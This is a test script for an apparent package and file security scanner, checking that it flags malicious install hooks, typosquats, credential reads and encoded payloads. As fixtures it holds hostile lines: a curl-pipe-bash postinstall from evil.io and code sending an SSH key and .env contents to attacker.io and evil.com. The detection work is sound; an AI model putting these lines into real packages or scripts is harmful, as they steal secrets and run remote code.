'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');

const { analysePackage, scanPackageJson } = require('../src/scanners/packageScanner');
const { scanFileContent } = require('../src/scanners/fileScanner');

let passed = 0;
let failed = 0;

function assert(label, condition, detail = '') {
  if (condition) {
    console.log(`  ✅ ${label}`);
    passed++;
  } else {
    console.error(`  ❌ ${label}${detail ? ` — ${detail}` : ''}`);
    failed++;
  }
}

function hasFinding(findings, type) {
  const t = type.toLowerCase();
  return findings.some(
    (f) => f.type.toLowerCase().includes(t) || f.reason.toLowerCase().includes(t)
  );
}

function hasSeverity(findings, severity) {
  return findings.some((f) => f.severity === severity);
}

function tmpPkgFile(name, pkgObj) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-'));
  const fp = path.join(dir, 'package.json');
  fs.writeFileSync(fp, JSON.stringify(pkgObj));
  return { fp, dir };
}

function tmpFile(name, content) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `beaverguard-test-${name}-`));
  const fp = path.join(dir, name);
  fs.writeFileSync(fp, content);
  return { fp, dir };
}

function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}

// ─── Package Scanner Tests ────────────────────────────────────────────────────
console.log('\n── Package Scanner Tests ──');

// Test 1
{
  const pkg = { dependencies: { 'node-telegram-utils': '1.0.0' } };
  const { fp, dir } = tmpPkgFile('t1', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects known malicious package (node-telegram-utils)', hasSeverity(findings, 'CRITICAL'), `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 2
{
  const pkg = { dependencies: { 'expresss': '4.18.0' } };
  const { fp, dir } = tmpPkgFile('t2', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects typosquat of express (expresss)', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 3
{
  const pkg = { scripts: { postinstall: 'curl https://evil.io/p.sh | bash' } };
  const { fp, dir } = tmpPkgFile('t3', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects malicious postinstall curl+bash', hasSeverity(findings, 'CRITICAL'), `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// Test 4
{
  const pkg = { scripts: { install: 'python3 -c "import socket,subprocess; s=socket.socket()"' } };
  const { fp, dir } = tmpPkgFile('t4', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects inline Python in install script', hasSeverity(findings, 'CRITICAL'), `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// Test 5
{
  const pkg = { dependencies: { 'some-lib': 'git+https://github.com/x/y.git' } };
  const { fp, dir } = tmpPkgFile('t5', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Flags git:// dependency source', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 6
{
  const pkg = { name: 'my-app', dependencies: { express: '^4.18.0', lodash: '^4.17.21' } };
  const { fp, dir } = tmpPkgFile('t6', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Clean package.json returns zero findings', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// ─── File Scanner Tests ───────────────────────────────────────────────────────
console.log('\n── File Scanner Tests ──');

// Test 7
{
  const content = `
const fs = require('fs');
const key = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
axios.post('https://attacker.io/collect', { key });
`;
  const { fp, dir } = tmpFile('evil.js', content);
  const findings = scanFileContent(fp);
  assert('Detects SSH key file read', hasFinding(findings, 'ssh'), `findings: ${JSON.stringify(findings.map(f => f.reason))}`);
  cleanup(dir);
}

// Test 8
{
  const content = `
const data = fs.readFileSync('.env', 'utf8');
fetch('https://evil.com/collect', { method: 'POST', body: data });
`;
  const { fp, dir } = tmpFile('steal.js', content);
  const findings = scanFileContent(fp);
  assert('Detects .env file read pattern', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 9
{
  const content = `const key = process.env.AWS_ACCESS_KEY_ID;\nconsole.log(key);`;
  const { fp, dir } = tmpFile('creds.js', content);
  const findings = scanFileContent(fp);
  assert('Detects AWS credential access', hasFinding(findings, 'aws'), `findings: ${JSON.stringify(findings.map(f => f.reason))}`);
  cleanup(dir);
}

// Test 10
{
  const payload = 'A'.repeat(60);
  const content = `const x = Buffer.from('${payload}', 'base64').toString();`;
  const { fp, dir } = tmpFile('payload.js', content);
  const findings = scanFileContent(fp);
  assert('Detects large base64 payload', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 11 — .env sensitive filename (exact basename '.env')
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-env-'));
  const fp = path.join(dir, '.env');
  fs.writeFileSync(fp, 'SECRET=abc123\nAPI_KEY=xyz789');
  const findings = scanFileContent(fp);
  assert('.env sensitive filename', hasFinding(findings, 'sensitive'), `findings: ${JSON.stringify(findings.map(f => f.reason))}`);
  cleanup(dir);
}

// Test 12
{
  const content = `
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Hello World'));
app.listen(3000);
`;
  const { fp, dir } = tmpFile('clean.js', content);
  const findings = scanFileContent(fp);
  assert('Clean JS file returns zero findings', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// ─── Summary ──────────────────────────────────────────────────────────────────
console.log(`\n── Results: ${passed} passed, ${failed} failed ──\n`);
if (failed > 0) process.exit(1);
